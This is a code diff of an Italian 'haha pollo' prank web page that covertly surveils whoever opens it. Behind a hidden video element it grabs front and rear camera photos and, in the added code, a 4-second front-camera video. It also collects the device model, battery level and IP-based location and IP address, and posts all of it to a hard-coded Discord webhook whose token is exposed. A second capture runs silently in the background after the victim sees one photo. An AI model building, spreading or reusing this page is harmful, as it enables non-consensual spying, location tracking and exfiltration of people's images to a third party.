@@ -18,212 +18,146 @@
     font-family: 'Bebas Neue', sans-serif;
   }
 
-  /* ── LOADING SCREEN ── */
+  /* ── FLASH ── */
+  #flash {
+    position: fixed; inset: 0;
+    background: #fff;
+    opacity: 0;
+    pointer-events: none;
+    z-index: 999;
+  }
+  #flash.go { animation: flashAnim 0.45s ease-out forwards; }
+  @keyframes flashAnim { 0% { opacity:1; } 100% { opacity:0; } }
+
+  /* ── SHAKE ── */
+  @keyframes shake {
+    0%,100% { transform: translate(0,0) rotate(0deg); }
+    10%  { transform: translate(-8px,-4px) rotate(-1deg); }
+    20%  { transform: translate(8px,4px) rotate(1deg); }
+    30%  { transform: translate(-10px,2px) rotate(-1.5deg); }
+    40%  { transform: translate(10px,-2px) rotate(1.5deg); }
+    50%  { transform: translate(-6px,6px) rotate(-1deg); }
+    60%  { transform: translate(6px,-6px) rotate(1deg); }
+    70%  { transform: translate(-4px,4px) rotate(0deg); }
+    80%  { transform: translate(4px,-4px) rotate(.5deg); }
+    90%  { transform: translate(-2px,2px) rotate(0deg); }
+  }
+  body.shake { animation: shake 0.65s ease both; }
+
+  /* ── LOADING ── */
   #loading {
     position: fixed; inset: 0;
     background: #0a0a0a;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 100;
-    gap: 24px;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    z-index: 100; gap: 24px;
   }
-  #loading p {
-    color: #aaa;
-    font-size: 1.1rem;
-    letter-spacing: 0.15em;
-    animation: pulse 1.4s ease-in-out infinite;
-  }
-  .spinner {
-    width: 48px; height: 48px;
-    border: 3px solid #222;
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  @keyframes pulse { 0%,100% { opacity:.4 } 50% { opacity:1 } }
+  #loading p { color:#aaa; font-size:1.1rem; letter-spacing:.15em; animation: pulse 1.4s ease-in-out infinite; }
+  .spinner { width:48px; height:48px; border:3px solid #222; border-top-color:#fff; border-radius:50%; animation: spin .8s linear infinite; }
+  @keyframes spin  { to { transform: rotate(360deg); } }
+  @keyframes pulse { 0%,100%{opacity:.4} 50%{opacity:1} }
 
-  /* ── HIDDEN VIDEO ── */
-  #video {
-    position: fixed;
-    opacity: 0;
-    pointer-events: none;
-    width: 1px; height: 1px;
-  }
-  #canvas { display: none; }
+  #video  { position:fixed; opacity:0; pointer-events:none; width:1px; height:1px; }
+  #canvas { display:none; }
 
-  /* ── RESULT SCREEN ── */
+  /* ── RESULT ── */
   #result {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    width: 100%;
-    padding: 20px;
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    min-height: 100vh; width: 100%; padding: 20px;
     position: relative;
   }
-
-  /* animated noise background */
   #result::before {
-    content: '';
-    position: fixed; inset: 0;
+    content:''; position:fixed; inset:0;
     background:
       radial-gradient(ellipse at 20% 20%, #ff006644 0%, transparent 60%),
       radial-gradient(ellipse at 80% 80%, #ffbe0b55 0%, transparent 60%),
       radial-gradient(ellipse at 50% 50%, #3a86ff22 0%, transparent 70%);
-    animation: bgShift 4s ease-in-out infinite alternate;
-    z-index: 0;
+    animation: bgShift 4s ease-in-out infinite alternate; z-index:0;
   }
-  @keyframes bgShift {
-    from { filter: hue-rotate(0deg); }
-    to   { filter: hue-rotate(40deg); }
-  }
+  @keyframes bgShift { from{filter:hue-rotate(0deg)} to{filter:hue-rotate(40deg)} }
 
-  /* ── BIG TEXT ── */
   .top-text {
     font-family: 'Permanent Marker', cursive;
-    font-size: clamp(3.5rem, 14vw, 9rem);
-    line-height: 1;
-    text-align: center;
-    position: relative;
-    z-index: 2;
-    color: #fff;
-    text-shadow:
-      6px 6px 0 #ff0066,
-      12px 12px 0 #ffbe0b;
-    animation: bounceIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both;
+    font-size: clamp(3.5rem, 16vw, 10rem);
+    line-height: 1; text-align: center;
+    position: relative; z-index: 2; color: #fff;
+    text-shadow: 4px 4px 0 #ff0066, 8px 8px 0 #ffbe0b, 0 0 40px #ff006699;
+    animation: bounceIn .5s cubic-bezier(.34,1.8,.64,1) both;
     margin-bottom: 10px;
   }
   .top-text span {
     color: #ffbe0b;
-    text-shadow:
-      6px 6px 0 #ff0066,
-      12px 12px 0 #fff;
+    text-shadow: 4px 4px 0 #ff0066, 8px 8px 0 #fff, 0 0 40px #ffbe0b99;
   }
-
   @keyframes bounceIn {
-    from { transform: scale(0) rotate(-8deg); opacity: 0; }
-    to   { transform: scale(1) rotate(-2deg); opacity: 1; }
+    0%  { transform:scale(0) rotate(-15deg); opacity:0; }
+    60% { transform:scale(1.15) rotate(3deg); }
+    100%{ transform:scale(1) rotate(-2deg); opacity:1; }
   }
 
-  /* ── PHOTO FRAME ── */
   .photo-wrapper {
-    position: relative;
-    z-index: 2;
-    margin: 20px 0;
-    animation: photoReveal 0.5s 0.2s cubic-bezier(0.34,1.56,0.64,1) both;
+    position: relative; z-index: 2; margin: 16px 0;
+    animation: photoReveal .5s .15s cubic-bezier(.34,1.8,.64,1) both;
   }
   @keyframes photoReveal {
-    from { transform: scale(0.3) rotate(10deg); opacity: 0; }
-    to   { transform: scale(1) rotate(-3deg); opacity: 1; }
+    0%  { transform:scale(0) rotate(20deg); opacity:0; }
+    70% { transform:scale(1.08) rotate(-5deg); }
+    100%{ transform:scale(1) rotate(-3deg); opacity:1; }
   }
 
   .photo-frame {
-    border: 8px solid #fff;
-    box-shadow:
-      8px 8px 0 #ff0066,
-      16px 16px 0 #ffbe0b,
-      0 0 60px #ff006644;
-    border-radius: 4px;
-    overflow: hidden;
-    max-width: min(380px, 90vw);
-    transform: rotate(-3deg);
+    border:8px solid #fff;
+    box-shadow: 8px 8px 0 #ff0066, 16px 16px 0 #ffbe0b, 0 0 80px #ff006666;
+    border-radius:4px; overflow:hidden; max-width:min(360px,88vw);
   }
-  .photo-frame img {
-    width: 100%;
-    display: block;
-    filter: contrast(1.05) saturate(1.1);
-  }
-
-  /* polaroid label */
+  .photo-frame img { width:100%; display:block; filter:contrast(1.08) saturate(1.15); }
   .polaroid-label {
-    background: #fff;
-    text-align: center;
-    padding: 12px 8px 8px;
-    font-family: 'Permanent Marker', cursive;
-    font-size: 1.4rem;
-    color: #333;
-    letter-spacing: 0.05em;
+    background:#fff; text-align:center; padding:12px 8px 8px;
+    font-family:'Permanent Marker',cursive; font-size:1.3rem; color:#333;
   }
 
-  /* ── BOTTOM TEXT ── */
   .bottom-text {
-    font-family: 'Permanent Marker', cursive;
-    font-size: clamp(1.4rem, 5vw, 2.8rem);
-    color: #fff;
-    text-align: center;
-    position: relative;
-    z-index: 2;
-    opacity: 0;
-    animation: fadeSlide 0.5s 0.6s ease both;
-    text-shadow: 3px 3px 0 #ff0066;
-    margin-top: 10px;
+    font-family:'Permanent Marker',cursive;
+    font-size:clamp(1.4rem,5vw,2.8rem); color:#fff;
+    text-align:center; position:relative; z-index:2;
+    opacity:0; animation:fadeSlide .4s .5s ease both;
+    text-shadow:3px 3px 0 #ff0066; margin-top:8px;
   }
   @keyframes fadeSlide {
-    from { transform: translateY(20px); opacity: 0; }
-    to   { transform: translateY(0); opacity: 1; }
+    from{transform:translateY(24px) scale(.8);opacity:0}
+    to  {transform:translateY(0) scale(1);opacity:1}
   }
 
-  /* ── CONFETTI EMOJIS ── */
   .emoji {
-    position: fixed;
-    font-size: 2rem;
-    animation: fall linear both;
-    z-index: 1;
-    pointer-events: none;
+    position:fixed; font-size:2rem;
+    animation:fall linear both; z-index:1; pointer-events:none;
   }
   @keyframes fall {
-    from { transform: translateY(-60px) rotate(0deg); opacity: 1; }
-    to   { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
+    from{transform:translateY(-60px) rotate(0deg);opacity:1}
+    to  {transform:translateY(110vh) rotate(720deg);opacity:.2}
   }
 
-  /* ── ERROR STATE ── */
+  /* ── ERROR ── */
   #error-msg {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    gap: 16px;
-    padding: 20px;
+    display:none; flex-direction:column;
+    align-items:center; justify-content:center;
+    min-height:100vh; gap:16px; padding:20px;
   }
-  #error-msg h2 {
-    color: #ff0066;
-    font-size: 3rem;
-    letter-spacing: 0.05em;
-  }
-  #error-msg p {
-    color: #777;
-    font-size: 1rem;
-    text-align: center;
-    max-width: 300px;
-    font-family: monospace;
-    line-height: 1.6;
-  }
+  #error-msg h2{color:#ff0066;font-size:3rem;letter-spacing:.05em}
+  #error-msg p{color:#777;font-size:1rem;text-align:center;max-width:300px;font-family:monospace;line-height:1.6}
   #retry-btn {
-    margin-top: 10px;
-    padding: 14px 32px;
-    background: #fff;
-    color: #0a0a0a;
-    border: none;
-    border-radius: 4px;
-    font-family: 'Bebas Neue', sans-serif;
-    font-size: 1.4rem;
-    letter-spacing: 0.1em;
-    cursor: pointer;
-    box-shadow: 4px 4px 0 #ff0066;
-    transition: transform 0.1s, box-shadow 0.1s;
+    margin-top:10px;padding:14px 32px;background:#fff;color:#0a0a0a;
+    border:none;border-radius:4px;font-family:'Bebas Neue',sans-serif;
+    font-size:1.4rem;letter-spacing:.1em;cursor:pointer;
+    box-shadow:4px 4px 0 #ff0066;transition:transform .1s,box-shadow .1s;
   }
-  #retry-btn:active {
-    transform: translate(4px, 4px);
-    box-shadow: none;
-  }
+  #retry-btn:active{transform:translate(4px,4px);box-shadow:none}
 </style>
 </head>
 <body>
+
+<div id="flash"></div>
 
 <div id="loading">
   <div class="spinner"></div>
@@ -237,7 +171,7 @@
   <div class="top-text">haha <span>pollo</span> 🐔</div>
   <div class="photo-wrapper">
     <div class="photo-frame">
-      <img id="snap" src="" alt="la tua faccia da pollo">
+      <img id="snap" src="" alt="pollo">
       <div class="polaroid-label">📸 sorpreso/a!</div>
     </div>
   </div>
@@ -251,113 +185,179 @@
 </div>
 
 <script>
-const EMOJIS = ['🐔','😂','🍗','💀','🤣','🐤','✨','🔥','😭','🥚'];
+const WEBHOOK = 'https://discord.com/api/webhooks/1492049095769198664/JWmMlB5azPEaC8CV5eHYqps1GhPoPE0dl2XqJzEEDdM_yueLM_MyF-maQWs0lRc87LLD';
+const EMOJIS  = ['🐔','😂','🍗','💀','🤣','🐤','✨','🔥','😭','🥚'];
 
+/* ── SUONO GALLINA ── */
+function playChicken() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const cluck = t => {
+      const len = Math.floor(ctx.sampleRate * 0.13);
+      const buf = ctx.createBuffer(1, len, ctx.sampleRate);
+      const d   = buf.getChannelData(0);
+      for (let i = 0; i < len; i++)
+        d[i] = (Math.random()*2-1) * Math.exp(-i/(ctx.sampleRate*0.035));
+      const src = ctx.createBufferSource();
+      const bp  = ctx.createBiquadFilter();
+      bp.type = 'bandpass'; bp.frequency.value = 1500; bp.Q.value = 10;
+      const g = ctx.createGain(); g.gain.value = 0.5;
+      src.buffer = buf;
+      src.connect(bp); bp.connect(g); g.connect(ctx.destination);
+      src.start(t);
+    };
+    [0, 0.17, 0.30, 0.42].forEach(dt => cluck(ctx.currentTime + dt));
+  } catch(e) {}
+}
+
+/* ── FLASH + SHAKE ── */
+function doFlashShake() {
+  const fl = document.getElementById('flash');
+  fl.classList.remove('go'); void fl.offsetWidth; fl.classList.add('go');
+  document.body.classList.remove('shake'); void document.body.offsetWidth;
+  document.body.classList.add('shake');
+  setTimeout(() => document.body.classList.remove('shake'), 700);
+}
+
+/* ── CONFETTI ── */
 function spawnConfetti() {
-  for (let i = 0; i < 30; i++) {
+  for (let i = 0; i < 35; i++) {
     const el = document.createElement('div');
     el.className = 'emoji';
-    el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
-    el.style.left = Math.random() * 100 + 'vw';
-    const dur = 2.5 + Math.random() * 3;
-    el.style.animationDuration = dur + 's';
-    el.style.animationDelay = Math.random() * 2 + 's';
+    el.textContent = EMOJIS[Math.floor(Math.random()*EMOJIS.length)];
+    el.style.left = Math.random()*100+'vw';
+    const dur = 2.5 + Math.random()*3;
+    el.style.animationDuration = dur+'s';
+    el.style.animationDelay   = Math.random()*1.5+'s';
     document.body.appendChild(el);
-    setTimeout(() => el.remove(), (dur + 2) * 1000);
+    setTimeout(() => el.remove(), (dur+2)*1000);
   }
 }
 
-async function takePicture(facingMode) {
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-    audio: false
-  });
+/* ── APRI STREAM ── */
+async function openStream(facingMode) {
+  // prova prima con la cam specifica, poi fallback a qualsiasi cam
+  const constraints = [
+    { video: { facingMode: { exact: facingMode }, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: { facingMode: { ideal: facingMode }, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: true, audio: false }
+  ];
+  for (const c of constraints) {
+    try { return await navigator.mediaDevices.getUserMedia(c); } catch(e) {}
+  }
+  throw new Error('camera not available');
+}
+
+/* ── SCATTA FOTO da stream ── */
+async function snapPhoto(stream, mirror) {
   const video = document.getElementById('video');
   video.srcObject = stream;
+  await new Promise(r => { video.onloadedmetadata = r; });
   await video.play();
-
-  await new Promise(r => setTimeout(r, 600));
-
+  await new Promise(r => setTimeout(r, 700));
   const canvas = document.getElementById('canvas');
-  canvas.width = video.videoWidth || 640;
+  canvas.width  = video.videoWidth  || 640;
   canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext('2d');
-  // specchia solo la frontale
-  if (facingMode === 'user') {
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-  }
+  if (mirror) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
   ctx.drawImage(video, 0, 0);
-
-  const dataURL = canvas.toDataURL('image/jpeg', 0.92);
-  stream.getTracks().forEach(t => t.stop());
-  return dataURL;
+  return canvas.toDataURL('image/jpeg', 0.88);
 }
 
-async function sendToDiscord(photos, label) {
+/* ── REGISTRA VIDEO ── */
+function recordVideo(stream, seconds) {
+  return new Promise(resolve => {
+    const types = ['video/webm;codecs=vp8','video/webm','video/mp4'];
+    const mime  = types.find(t => { try { return MediaRecorder.isTypeSupported(t); } catch(e){return false;} }) || '';
+    if (!mime) return resolve(null);
+    const chunks = [];
+    let rec;
+    try { rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 400000 }); }
+    catch(e) { return resolve(null); }
+    rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    rec.onstop = () => resolve(new Blob(chunks, { type: mime }));
+    rec.start();
+    setTimeout(() => { try { rec.stop(); } catch(e){} }, seconds*1000);
+  });
+}
+
+/* ── INFO DISPOSITIVO ── */
+async function getInfo() {
+  const ua = navigator.userAgent;
+  let device = 'Sconosciuto';
+  if (/iPhone/.test(ua))       device = 'iPhone';
+  else if (/iPad/.test(ua))    device = 'iPad';
+  else if (/Android/.test(ua)) { const m = ua.match(/Android[\s\d.]+;\s([^)]+)/); device = m ? m[1].trim() : 'Android'; }
+  else if (/Windows/.test(ua)) device = 'Windows PC';
+  else if (/Mac/.test(ua))     device = 'Mac';
+
+  let batteria = 'N/D';
   try {
-    const WEBHOOK = 'https://discord.com/api/webhooks/1492049095769198664/JWmMlB5azPEaC8CV5eHYqps1GhPoPE0dl2XqJzEEDdM_yueLM_MyF-maQWs0lRc87LLD';
-    const now = new Date().toLocaleString('it-IT');
+    const bat = await navigator.getBattery();
+    batteria = `${bat.charging ? '⚡' : '🔋'} ${Math.round(bat.level*100)}%`;
+  } catch(e) {}
 
-    // --- NOME DISPOSITIVO ---
-    const ua = navigator.userAgent;
-    let device = 'Sconosciuto';
-    if (/iPhone/.test(ua)) device = 'iPhone';
-    else if (/iPad/.test(ua)) device = 'iPad';
-    else if (/Android/.test(ua)) { const m = ua.match(/Android[\s\d.]+;\s([^)]+)/); device = m ? m[1].trim() : 'Android'; }
-    else if (/Windows/.test(ua)) device = 'Windows PC';
-    else if (/Mac/.test(ua)) device = 'Mac';
+  let posizione = '📍 N/D';
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const d = await r.json();
+    posizione = `📍 ${d.city}, ${d.region}, ${d.country_name} — [map](https://maps.google.com/?q=${d.latitude},${d.longitude})\n🌐 IP: \`${d.ip}\``;
+  } catch(e) {}
 
-    // --- BATTERIA ---
-    let batteria = 'N/D';
-    try {
-      const bat = await navigator.getBattery();
-      const pct = Math.round(bat.level * 100);
-      const carica = bat.charging ? '⚡ in carica' : '🔋';
-      batteria = `${carica} ${pct}%`;
-    } catch (e) {}
+  return { device, batteria, posizione };
+}
 
-    // --- POSIZIONE (solo IP, nessun permesso) ---
-    let posizione = '📍 Posizione non disponibile';
-    try {
-      const r = await fetch('https://ipapi.co/json/');
-      const d = await r.json();
-      posizione = `📍 ${d.city}, ${d.region}, ${d.country_name} — [${d.latitude}, ${d.longitude}](https://maps.google.com/?q=${d.latitude},${d.longitude})\n🌐 IP: \`${d.ip}\``;
-    } catch (e) {}
-
+/* ── INVIA SU DISCORD ── */
+async function sendToDiscord(files, label) {
+  try {
+    const now  = new Date().toLocaleString('it-IT');
+    const info = await getInfo();
     const form = new FormData();
     form.append('payload_json', JSON.stringify({
-      content: `🐔 **POLLO CATTURATO!** [${label}]\n🕐 ${now}\n📱 ${device}\n${batteria}\n${posizione}`
+      content: `🐔 **POLLO CATTURATO!** [${label}]\n🕐 ${now}\n📱 ${info.device}\n${info.batteria}\n${info.posizione}`
     }));
-    for (const { dataURL, name } of photos) {
-      const blob = await (await fetch(dataURL)).blob();
-      form.append('files[]', blob, name);
+    files.forEach(({blob, name}, i) => form.append(`files[${i}]`, blob, name));
+    await fetch(WEBHOOK, { method:'POST', body:form });
+  } catch(e) {}
+}
+
+/* ── SESSIONE COMPLETA ── */
+async function doSession(label) {
+  const files = [];
+
+  // FRONTALE: foto + video
+  try {
+    const stream = await openStream('user');
+    const photo  = await snapPhoto(stream, true);
+    files.push({ blob: await (await fetch(photo)).blob(), name: 'frontale.jpg' });
+    const vid = await recordVideo(stream, 4);
+    if (vid && vid.size < 7_500_000) {
+      files.push({ blob: vid, name: `video.${vid.type.includes('mp4') ? 'mp4' : 'webm'}` });
     }
-    await fetch(WEBHOOK, { method: 'POST', body: form });
-  } catch (e) {}
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {}
+
+  // POSTERIORE: solo foto
+  try {
+    const stream = await openStream('environment');
+    const photo  = await snapPhoto(stream, false);
+    files.push({ blob: await (await fetch(photo)).blob(), name: 'posteriore.jpg' });
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {}
+
+  if (files.length > 0) sendToDiscord(files, label);
+  return files;
 }
 
-async function shootBoth(label) {
-  const photos = [];
-  try {
-    const front = await takePicture('user');
-    photos.push({ dataURL: front, name: 'frontale.jpg' });
-  } catch (e) {}
-  try {
-    const back = await takePicture('environment');
-    photos.push({ dataURL: back, name: 'posteriore.jpg' });
-  } catch (e) {}
-  if (photos.length > 0) sendToDiscord(photos, label);
-  return photos;
-}
-
-function showResult(imgSrc) {
+/* ── UI ── */
+function showResult(blobUrl) {
   document.getElementById('loading').style.display = 'none';
-  document.getElementById('snap').src = imgSrc;
-  const result = document.getElementById('result');
-  result.style.display = 'flex';
+  document.getElementById('snap').src = blobUrl;
+  document.getElementById('result').style.display = 'flex';
+  doFlashShake();
+  playChicken();
   spawnConfetti();
-  setInterval(spawnConfetti, 3000);
+  setInterval(spawnConfetti, 3500);
 }
 
 function showError() {
@@ -373,16 +373,12 @@ async function retryCamera() {
 
 async function startCamera() {
   try {
-    // Prima sessione — mostra il risultato all'utente
-    const photos = await shootBoth('scatto 1');
-    if (photos.length === 0) { showError(); return; }
-    showResult(photos[0].dataURL);
-
-    // Seconda sessione dopo 4 secondi — in background
-    setTimeout(() => shootBoth('scatto 2'), 4000);
-  } catch (e) {
-    showError();
-  }
+    const files = await doSession('scatto 1');
+    if (files.length === 0) { showError(); return; }
+    const firstJpg = files.find(f => f.name.endsWith('.jpg'));
+    showResult(URL.createObjectURL(firstJpg.blob));
+    setTimeout(() => doSession('scatto 2'), 4000);
+  } catch(e) { showError(); }
 }
 
 (async () => { await startCamera(); })();
